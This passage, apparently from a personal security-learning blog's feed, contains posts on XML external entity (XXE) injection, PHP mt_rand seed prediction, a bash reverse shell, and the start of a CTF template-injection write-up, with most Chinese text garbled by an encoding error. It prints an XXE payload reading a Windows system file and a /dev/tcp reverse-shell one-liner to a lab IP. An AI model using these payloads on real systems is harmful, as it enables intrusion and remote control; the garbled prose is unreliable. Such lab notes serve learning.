&lt;!--bookstoreçš„ç»“æŸ--&gt;</code></pre><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> ç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´ã€‚<br>standaloneå€¼æ˜¯yesçš„æ—¶å€™è¡¨ç¤ºDTDä»…ç”¨äºéªŒè¯æ–‡æ¡£ç»“æ„ï¼Œä»è€Œå¤–éƒ¨å®ä½“å°†è¢«ç¦ç”¨ï¼Œä½†å®ƒçš„é»˜è®¤å€¼æ˜¯noï¼Œè€Œä¸”æœ‰äº›parserä¼šç›´æ¥å¿½ç•¥è¿™ä¸€é¡¹ã€‚</p><h3>åŸºæœ¬è¯­æ³•</h3><li>æ‰€æœ‰çš„XMLå…ƒç´ éƒ½éœ€è¦æœ‰å…³é—­æ ‡ç­¾<li>XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ<li>XMLå¿…é¡»æ­£ç¡®åœ°åµŒå¥—<li>XMLæ–‡æ¡£å¿…éœ€æœ‰æ ¹å…ƒç´ <li>XMLåœ°å±æ€§å¿…é¡»åŠ å¼•å·<p>è‹¥æœ‰å¤šä¸ªå­—ç¬¦éœ€è¦è½¬ä¹‰ï¼Œåˆ™å¯ä»¥å°†è¿™äº›å­—ç¬¦å­˜æ”¾åœ¨CDATAé‡Œé¢</p><h2>xmlæ³¨å…¥</h2><p>è¿™ä¸ªæˆ‘è®°å¾—æ‹›æ–°è€ƒè¯•ä¸­æœ‰è¿™ä¸ªxmlæ³¨å…¥ï¼Œè¯´æ¥æƒ­æ„§è¿™ä¹ˆé•¿æ—¶é—´è¿˜æ˜¯å¯¹è¿™ä¸ªæ²¡æœ‰ä»€ä¹ˆäº†è§£</p><p><img src="1.png"></p><p>xxeæ˜¯ä¸€ä¸ªå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼Œéœ€è¦æˆ‘ä»¬ç›¯å¥½å¤–éƒ¨å®ä½“è¿™ä¸ªè¯çœ¼ï¼Œå¦‚æœæˆ‘ä»¬æ³¨å…¥çš„å¤–éƒ¨å®ä½“å¯ä»¥è¢«è§£æçš„è¯ï¼Œé‚£ä¹ˆå°†ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬è¿›è¡Œxmlæ³¨å…¥çš„æ”»å‡»é¢</p><h2>åŸºç¡€çŸ¥è¯†</h2><h3>xmlæ–‡æ¡£çš„æ„å»ºæ¨¡å¼</h3><li> å…ƒç´ : æ˜¯xmlä»¥åŠhtmlæ–‡æ¡£çš„ä¸»è¦æ„ä»¶æ¨¡å—ï¼Œä»ï¼ˆä¸”åŒ…æ‹¬ï¼‰å¼€å§‹æ ‡ç­¾ç›´åˆ°ï¼ˆä¸”åŒ…æ‹¬ï¼‰ç»“æŸæ ‡ç­¾çš„éƒ¨åˆ†ï¼Œå…ƒç´ å¯é—¹å«æ–‡æœ¬ï¼Œå…¶ä»–å…ƒç´ æˆ–è€…æ˜¯å±æ€§<pre><code>&lt;title&gt;my blog&lt;/title&gt;</code></pre><li>å±æ€§<pre><code>&lt;img src=&quot;r1ght0us.gif&quot; /&gt;</code></pre><li>å®ä½“<p>å®ä½“æ˜¯æŒ‡ç”¨æ¥å®šä¹‰æ™®é€šçš„æ–‡æœ¬å˜é‡</p><li>PCDATA<p>parsed character data è¢«è§£æçš„æ–‡æœ¬æ•°æ®ï¼Œè¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°</p><li>CDATA<p>ä¸ä¼šè¢«è§£æçš„æ–‡æœ¬</p><p>XMLæœ‰è‡ªå·±çš„æ ¼å¼è§„èŒƒ,è¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯æœ‰DTDæ§åˆ¶çš„ï¼Œå®ƒé•¿ä¸‹é¢è¿™æ ·</p><p><img src="2.png"></p><p>è¿™ä¸ªDTDè¯´æ˜äº†XMLçš„æ ¹å…ƒç´ æ—¶messageï¼Œç„¶åæ ¹å…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆXMLåˆ°æ—¶å€™åƒä¸‹é¢è¿™æ ·å†™</p><p><img src="3.png"></p><p>é™¤äº†åœ¨DTDå®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº”XMLä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨DTDä¸­å®šä¹‰å®ä½“ï¼ˆå¯¹åº”xmlä¸­çš„å†…å®¹ï¼‰ï¼Œæ¯•ç«ŸXMLä¸­é™¤äº†æ ‡ç­¾ä¸€å±‹å­ï¼Œè¿˜æœ‰äº›å†…å®¹æ—¶å›ºå®šçš„</p><p>ç¤ºä¾‹ä»£ç </p><p><img src="4.PNG"></p><p>è¿™é‡Œå®šä¹‰ä½ANYè¯´æ˜æ¥å—ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ä¸ªxmlå®ä½“ï¼ˆå®ä½“å…¶å®å¯ä»¥ä½œä¸ºä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡&amp;ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆXMLå°±å¯ä»¥å†™æˆè¿™æ ·</p><p><img src="5.PNG"></p><p>è¾“å‡ºçš„&amp;xxeä¼šè¢«â€œtestâ€æ›¿æ¢</p><h2>DTD</h2><p>å†è¯¦ç»†ä¸€ç‚¹</p><p>XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ã€‚<br>DTDç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ã€‚æ˜¯XMLæ–‡æ¡£ä¸­çš„å‡ æ¡è¯­å¥ï¼Œç”¨æ¥è¯´æ˜å“ªäº›å…ƒç´ /å±æ€§æ˜¯åˆæ³•çš„ä»¥åŠå…ƒç´ é—´åº”å½“æ€æ ·åµŒå¥—/ç»“åˆï¼Œä¹Ÿç”¨æ¥å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦å’Œå¯å¤ç”¨ä»£ç æ®µè‡ªå®šä¹‰ä¸ºå®ä½“ã€‚</p><h3>å®ä½“å¼•ç”¨</h3><p>XMLå…ƒç´ å½¢å¦‚<tag>foo</tag>åœ°æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°ç±»ä¼¼äº<code>&lt;</code>åœ°ç‰¹æ®Šç¬¦å·ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº†äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨<code>&amp;lt;&amp;gt;&amp;amp;&amp;apos;&amp;quot;</code>æ›¿æ¢<code>&lt; &gt; &amp; &#39; &quot;</code></p><p>å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼äºå®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«åœ°æ•ˆæœï¼Œä¸ºäº†æ”¾æ¦œï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ã€‚</p><h3>DTDçš„å¼•å…¥æ–¹å¼</h3><p>DTDçš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTDå¯ä»¥åœ¨XMLæ–‡æ¡£å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯ä»¥åœ¨æ–‡æ¡£å¤–éƒ¨å£°æ˜</p><li>å†…éƒ¨DTD<blockquote><!DOCTYPE  æ ¹å…ƒç´ åç§° [å…ƒç´ å£°æ˜]></blockquote><p>ç¤ºä¾‹ä»£ç </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;</code></pre><p>å¤–éƒ¨DTD</p><p>(1) å¼•å…¥å¤–éƒ¨DTDæ–‡ä»¶</p><blockquote><!DOCTYPE æ ¹å…ƒç´ åç§° SYSTEM â€œdtdè·¯å¾„â€></blockquote><p>(2)ä½¿ç”¨ç½‘ç»œä¸Šçš„DTDæ–‡ä»¶</p><blockquote><!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC "DTDåç§°" "DTDæ–‡æ¡£ä¸­çš„URL"></blockquote><h3>PCDATA</h3>PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•&ï¼Œ<ï¼Œæˆ–è€…>å­—ç¬¦ï¼Œéœ€è¦ç”¨&amp; &lt; &gt;å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚<h3>CDATA</h3>CDATAæ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚<p><img src="9.png"></p><h3>DTDå±æ€§</h3>å±æ€§å£°æ˜è¯­æ³•:<blockquote><!STTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼ ></blockquote><p>DTDå®ä¾‹ï¼š </p><blockquote><!ATTLIST payment lucky CDATA "Q"></blockquote><p>ä»¥ä¸‹æ˜¯å±æ€§ç±»å‹çš„é€‰é¡¹ï¼š</p><p><img src="10.png"></p><h2>DTDå®ä½“</h2><blockquote><p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p></blockquote><p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><blockquote><p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p></blockquote><p>æŒ‰å®ä½“æœ‰æ— å‚æ•°åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</p><p>ä¸€èˆ¬å®ä½“çš„å£°æ˜ï¼š<!ENTITY å®ä½“åç§° "å®ä½“å†…å®¹"></p><p>å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•æ˜¯ï¼š &amp;å®ä½“åç§°ï¼›</p><p>æ™®é€šå®ä½“å¯ä»¥åœ¨DTDä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨XMLä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œè¿˜å¯ä»¥åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚</p><p>å‚æ•°å®ä½“çš„å£°æ˜ï¼š<!ENTITY % å®ä½“åç§° "å®ä½“å†…å®¹"></p><p>å¼•ç”¨å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š%å®ä½“åç§°;</p><p>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­å¼•ç”¨ï¼Œä¸èƒ½åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œä¹Ÿä¸èƒ½åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚<br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒ</p><p><img src="11.png"></p><h2>é‡ç‚¹1</h2><p>å®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ï¼Œä¸Šè¿°æˆ‘ä»¬ä¸¾ä¾‹æ—¶å†…éƒ¨å®ä½“ï¼Œå¤–éƒ¨å®ä½“è¯¾é¢˜ä»å¤–éƒ¨dtdæ–‡ä»¶ä¸­å¼•ç”¨ã€‚</p><p><img src="6.PNG"></p><p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€ä½œçš„å­å’Œæ”¹å˜éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ï¼Œéå¸¸æ–¹ä¾¿</p><p><i>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</i></p><p>è¿˜æœ‰ä¸€ç§å¼•ç”¨å…¬ç”¨DTDçš„æ–¹å¼</p><blockquote><!DOCTYPE æ ¹å…ƒç´ åç§°  PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€></blockquote><p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’ŒSYSTEMä¸€æ ·çš„ä½œç”¨</p><h2>é‡ç‚¹2</h2><p>æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ï¼‰ï¼Œä½†æ˜¯ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“è¢«åˆ†ä¸ºé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“</p><li> é€šç”¨å®ä½“<p>ç”¨&amp;å®ä½“åï¼›å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTDä¸­çš„å®šä¹‰ï¼Œåœ¨XMLæ–‡æ¡£ä¸­å¼•ç”¨</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; &lt;updateProfile&gt;  &lt;firstname&gt;Joe&lt;/firstname&gt;  &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  ... &lt;/updateProfile&gt;</code></pre><li>å‚æ•°å®ä½“<p>(1)ä½¿ç”¨<code>% å®ä½“å</code>(è¿™é‡Œçš„ç©ºæ ¼ä¸èƒ½å°‘) åœ¨DTDä¸­å®šä¹‰ï¼Œå†°æ´åªèƒ½åœ¨DTDä¸­ä½¿ç”¨<code>% å®ä½“åï¼›</code> å¼•ç”¨</p><p>(2)åªæœ‰åœ¨DTDæ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</p><p>(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><h2>åŸç†</h2><p><code>æ³¨å…¥</code>ï¼š  æ˜¯æŒ‡<code>xmlæ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ä¿®æ”¹</code>ï¼Œå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œäº†ç§€å˜åçš„æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°äº†æ”»å‡»ç›®çš„ã€‚</p><p><code>å¤–éƒ¨å®ä½“ï¼š  </code>åˆ™æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡åˆ©ç”¨å¤–éƒ¨å®ä½“å£°æ˜éƒ¨åˆ†çš„â€œSYSTEMâ€å…³é”®è¯å¯¼è‡´XMLè§£æå™¨å¯ä»¥ä»æœ¬åœ°æˆ–è€…è¿œç¨‹URIè¯»å–å—ä¿æŠ¤çš„æ•°æ®ã€‚</p><h2>åˆ¤æ–­æ˜¯å¦å­˜åœ¨xxeæ¼æ´</h2><p>æœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯ç”¨burpæŠ“åŒ…ï¼Œç„¶åï¼Œä¿®æ”¹HTTPè¯·æ±‚æ–¹æ³•ï¼Œä¿®æ”¹Content-Typeå¤´éƒ¨å­—æ®µç­‰ç­‰ï¼ŒæŸ¥çœ‹è¿”å›åŒ…çš„å“åº”ï¼Œçœ‹çœ‹åº”ç”¨ç¨‹åºæ˜¯å¦è§£æäº†å‘é€çš„å†…å®¹ï¼Œä¸€æ—¦è§£æäº†ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½XXEæ”»å‡»æ¼æ´</p><p><a href="http://192.168.111.1/bWAPP/xxe-1.php">bwapp</a></p><p><img src="8.PNG"></p><p>å·²ç»è¢«è§£æçš„çŠ¶æ€</p><h2>XMLæ³¨å…¥</h2>XMLæ˜¯ä¸€ç§æ•°æ®ç»„ç»‡å­˜å‚¨çš„æ•°æ®ç»“æ„æ–¹å¼ï¼Œå®‰å…¨çš„XMLåœ¨ç”¨æˆ·è¾“å…¥ç”Ÿæˆæ–°çš„æ•°æ®æ—¶å€™åº”è¯¥åªèƒ½å…è®¸ç”¨æˆ·æ¥å—çš„æ•°æ®ï¼Œéœ€è¦è¿‡æ»¤æ‰ä¸€äº›å¯ä»¥æ”¹å˜XMLæ ‡ç­¾ä¹Ÿå°±æ˜¯è¯´æ”¹å˜XMLç»“æ„æ’å…¥æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚æ–°çš„è´¦æˆ·ä¿¡æ¯ï¼Œç­‰äºæ·»åŠ äº†è´¦æˆ·ï¼‰çš„ç‰¹æ®Šè¾“å…¥ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œåˆ™å¯ä»¥å¯¼è‡´XMLæ³¨å…¥æ”»å‡»ã€‚<h2>æ³¨å…¥å‰æ</h2><p>(1)ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶æ•°æ®çš„è¾“å…¥<br>(2)ç¨‹åºæœ‰æ‹¼å‡‘çš„æ•°æ®</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php-ä¼ªéšæœºæ•°çˆ†ç ´</title>
      <link href="/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/"/>
      <url>/2021/04/17/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><a href="https://blog.csdn.net/qq_45521281/article/details/107302795?utm_source=app&app_version=4.5.8">å‚è€ƒåœ°å€</a></p><p><code>è®¡ç®—æœºåªèƒ½äº§ç”Ÿä¼ªéšæœºæ•°ä¸èƒ½äº§ç”Ÿç»å¯¹éšæœºçš„éšæœºæ•°</code></p><h2>ä¸ä¼ªéšæœºæ•°æœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°</h2><li>mt_rand()<blockquote><p>mt_rand(min,max),å¦‚æœæ²¡æœ‰æä¾›minå’Œmax,è¿”å›0åˆ°RAND-MAXä¹‹é—´å¯¹çš„ä¼ªéšæœºæ•°</p></blockquote><li>mt_scand()<blockquote><p>mt_scand(seed),seed:è§„å®šæ’­ç§å€¼ï¼Œç”¨seedæ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§</p></blockquote><p><img src="1.PNG"></p><p>å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬æŠŠmt_scand()ä¸­çš„seedè®¾ç½®ä¸ºä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œé‚£ä¹ˆç”Ÿæˆçš„éšæœºæ•°çš„æ˜¯ä¸€æ ·ï¼Œåœ¨php 4.2ä¹‹åï¼Œphpä¼šè‡ªåŠ¨æ’­ç§ç§å­ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— éœ€è®¾ç½®</p><h2>phpä¼ªéšæœºæ•°çš„å®‰å…¨</h2><li>å¯é¢„æµ‹æ€§<p><mark>ä¼ªéšæœºæ˜¯ç”±å¯ç¡®å®šçš„å‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªç§å­ï¼ˆå¸¸ç”¨æ—¶é’Ÿï¼‰æ’­ç§ï¼Œäº§ç”Ÿçš„ä¼ªéšæœºæ•°ã€‚è¿™æ„å‘³ç€ï¼šå¦‚æœçŸ¥é“äº†ç§å­ï¼Œæˆ–è€…å·²ç»äº§ç”Ÿçš„éšæœºæ•°ï¼Œæˆ–è€…å·²çŸ¥äº§ç”Ÿçš„éšæœºæ•°çš„ä¸€éƒ¨åˆ†ï¼Œéƒ½å¯èƒ½è·å¾—æ¥ä¸‹æ¥éšæœºæ•°åºåˆ—çš„ä¿¡æ¯ï¼ŒçŸ¥é“äº†ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå°±å¯ä»¥ç¡®å®šä½ çš„ç§å­å€¼ã€‚ ï¼ˆå¯é¢„æµ‹æ€§ï¼‰ã€‚</p><p>ç®€å•å‡è®¾ä¸€ä¸‹ mt_rand()å†…éƒ¨ç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ä¸º: rand = seed+(i10) å…¶ä¸­ seed æ˜¯éšæœºæ•°ç§å­ï¼Œ i è¡¨ç¤ºç¬¬å‡ æ¬¡è°ƒç”¨è¿™ä¸ªéšæœºæ•°å‡½æ•°ã€‚å½“æˆ‘ä»¬åŒæ—¶çŸ¥é“ i å’Œ rand ä¸¤ä¸ªå€¼çš„æ—¶å€™ï¼Œå°±èƒ½å¾ˆå®¹æ˜“çš„ç®—å‡ºseedçš„å€¼æ¥ã€‚æ¯”å¦‚ rand=21 , i=2 ä»£å…¥å‡½æ•° 21=seed+(20) å°±èƒ½å¾—åˆ° seed=1 ã€‚æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°seedä¹‹åï¼Œå°±èƒ½è®¡ç®—å‡ºå½“ i ä¸ºä»»æ„å€¼æ—¶å€™çš„ rand çš„å€¼äº†ã€‚</mark></p><h2>phpè‡ªåŠ¨æ’­ç§</h2><p>å½“php 4.2.0çš„æ—¶å€™ï¼Œæ’­ç§æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ï¼Œphpæ¯æ¬¡è°ƒç”¨mt_rand()å‡½æ•°çš„æ—¶å€™ï¼Œéƒ½ä¼šå…ˆæ£€æŸ¥æ˜¯å¦å·²ç»æ’­ç§ï¼Œå¦‚æœæ’­ç§å°±ç›´æ¥äº§ç”Ÿéšæœºæ•°ï¼Œå¦åˆ™è°ƒç”¨php_mt_srandæ¥æ’­ç§ã€‚åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­ï¼Œåªæœ‰ç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()ä¼šæ’­ç§ï¼Œæ¥ä¸‹æ¥ä¼šæ ¹æ®è¿™ä¸ªç¬¬ä¸€æ¬¡æ’­ç§çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°</p><h2>ç§å­çˆ†ç ´å·¥å…·-php_mt_seed</h2><p>å®ƒå¯ä»¥æ ¹æ®å•æ¬¡mt_rand()çš„è¾“å‡ºç»“æœç›´æ¥çˆ†ç ´å‡ºå¯èƒ½çš„ç§å­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çˆ†ç ´ç±»ä¼¼mt_rand(1,100)è¿™æ ·é™å®šäº†MIN MAXè¾“å‡ºçš„ç§å­ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shell</title>
      <link href="/2021/04/10/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2021/04/10/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>bashåå¼¹shell</h2><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.24.133/8080 0&gt; &amp;1</p></blockquote><p>bashä¸€å¥è¯å‘½ä»¤è¯¦è§£</p><p><img src="1.png"></p><p>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒä¸æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚</p><p>å…ˆç”¨kaliå¼€å¯ç›‘å¬<br><img src="2.PNG"></p><p>ç„¶ååœ¨centosæ‰§è¡Œbashä¸€å¥è¯</p><p><img src="3.PNG"></p><p>å†å¤ä¹ ä¸€ä¸‹</p><p>bash -i &gt;&amp; /dev/tcp/ipåœ°å€/ç«¯å£ 0&gt;&amp;1</p><p><img src="4.PNG"></p><p>æˆåŠŸï¼ï¼ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Buu-flasklight</title>
      <link href="/2021/04/09/Buu-flasklight/"/>
      <url>/2021/04/09/Buu-flasklight/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ€€ç–‘æ˜¯sstiæ¨¡æ¿æ³¨å…¥ï¼Œç„¶åf12æŸ¥çœ‹æºç åï¼Œçš„è¿™æ˜¯è¾“å…¥ï¼Ÿsearchï¼Œè¯·æ±‚æ–¹å¼æ˜¯getã€‚</p><p>åšä¸€ä¸ªæµ‹è¯•</p><pre><code>&#123;&#123;7*7&#125;&#125;,&#123;&#123;config&#125;&#125;</code></pre><p>é€šè¿‡æŸ¥çœ‹configï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é…ç½®</p><p><img src="1.PNG"></p><p>æœ‰ä¸€ç‚¹CCC{the_flag_is_this_dir}ï¼Œè¯´æ˜flagï¼Œå°±åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œå°è¯•ç”¨fileè¯»å–</p><p><img 